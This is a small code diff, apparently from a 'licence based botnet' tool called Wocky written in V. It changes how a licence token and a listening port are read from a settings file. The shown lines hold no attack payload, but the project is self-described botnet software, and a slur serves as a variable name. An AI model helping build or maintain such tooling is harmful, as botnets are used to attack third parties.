@@ -6,6 +6,7 @@ import banner_sys
 import config
 import time
 import server
+import utils
 
 // method -> licence_validation()
 // note -> licence based botnet 
@@ -32,8 +33,8 @@ pub fn licence_valiation() {
 pub fn get_token() string {
 	if os.exists(os.getwd() + "/config/settings.cfg") {
 		mut token := os.read_lines(os.getwd() + "/config/settings.cfg") or { [',',','] }
-		if token[3].replace("wocky_token=", "") != "" {
-			return token[3].replace("wocky_token=", "")
+		if token[2].contains("wocky_token=") {
+			return token[2].replace("wocky_token=", "")
 		} else {
 			mut fag := os.input("Wocky Token Key: ")
 			return fag
@@ -89,6 +90,9 @@ pub fn help_banner() string {
 }
 
 pub fn port_check(arg []string) string {
+	mut c_s := utils.Wocky_Settings{}
+	mut port := c_s.get_settings()[3]
+	if port == "" { } else { return port }
 	mut arg_c := arg.len
 	if arg_c == 2 {
 		return arg[1].replace("-p", "")
